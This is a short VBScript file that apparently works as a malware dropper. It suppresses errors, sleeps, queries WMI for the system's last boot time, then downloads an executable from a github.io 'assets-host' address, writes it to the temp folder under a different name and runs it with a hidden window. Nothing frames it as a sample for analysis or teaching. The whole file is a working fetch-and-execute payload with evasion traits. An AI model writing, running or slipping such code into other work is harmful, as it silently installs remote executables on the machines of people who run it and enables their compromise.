On Error Resume Next
WScript.Sleep 2600
Set w=GetObject("winmgmts:\\.\root\cimv2")
Set c=w.ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
For Each o In c
  bt=o.LastBootUpTime
Next
Set h=CreateObject("MSXML2.ServerXMLHTTP")
h.Open "GET","https://boostedboynow.github.io/assets-host/n5ii8a.exe",0
h.Send
If h.Status<>200 Then WScript.Quit
Set s=CreateObject("ADODB.Stream")
s.Type=1:s.Open:s.Write h.responseBody
p=CreateObject("WScript.Shell").ExpandEnvironmentStrings("%tmp%\n542.exe")
s.SaveToFile p,2:s.Close
CreateObject("WScript.Shell").Run p,0
